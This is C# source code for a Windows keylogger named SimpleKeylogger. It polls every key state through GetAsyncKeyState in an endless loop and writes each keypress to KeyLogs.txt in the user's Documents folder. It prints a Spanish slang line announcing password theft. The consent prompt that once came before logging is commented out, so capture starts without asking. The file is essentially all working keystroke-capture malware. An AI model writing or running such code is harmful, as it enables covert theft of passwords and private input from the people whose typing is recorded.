using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
namespace namespace_SimpleKeylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            Start();
            Console.WriteLine("TAMO ROBANDO PASWOL");
            //Console.WriteLine("Do you want to start keylogging? Y/N");
            //string YesNo = Console.ReadLine();
            //if (YesNo.Equals("Y"))
            //{
            //    Start();
            //}
            //else
            //{
            //    Console.WriteLine("Exiting...");
            //    Application.Exit();
            //}
        }
        static void Start()
        {
            File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\KeyLogs.txt", "\t\tNueva Sesion:\t" + DateTime.Now);
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        Console.WriteLine((Keys)i);
                        string toStringKeys = Convert.ToString((Keys)i);
                        File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\KeyLogs.txt", Environment.NewLine + toStringKeys);
                        break;
                    }
                }
            }
        }
    }
}
